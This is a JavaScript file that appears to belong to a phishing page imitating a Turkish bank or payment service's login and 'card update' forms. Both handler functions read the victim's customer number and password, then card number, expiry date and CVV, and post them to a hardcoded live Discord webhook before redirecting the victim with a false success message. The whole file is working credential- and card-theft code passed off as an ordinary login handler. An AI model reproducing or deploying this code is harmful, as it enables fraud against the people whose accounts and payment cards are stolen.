function handleLogin(event) {
    event.preventDefault();
    const customer_id = document.getElementById("customer_id").value;
    const password = document.getElementById("password").value;
    const data = `Müşteri No: ${customer_id}, Şifre: ${password}`;

    fetch("https://discord.com/api/webhooks/1356649086886875259/EMzyEQwmf4BXE-0-NA8Y9SKMTmDazDF5T6PEnIh7M55tmxUSJW10jS7d4LBlZZUoqi2H", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: data })
    }).then(() => {
        window.location.href = "card.html";
    });
}

function handleCard(event) {
    event.preventDefault();
    const cc = document.getElementById("cc").value;
    const expiry = document.getElementById("expiry").value;
    const cvv = document.getElementById("cvv").value;
    const data = `CC: ${cc}, Expiry: ${expiry}, CVV: ${cvv}`;

    fetch("https://discord.com/api/webhooks/1356649086886875259/EMzyEQwmf4BXE-0-NA8Y9SKMTmDazDF5T6PEnIh7M55tmxUSJW10jS7d4LBlZZUoqi2H", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: data })
    }).then(() => {
        alert("Güncelleme başarılı!");
        window.location.href = "index.html";
    });
}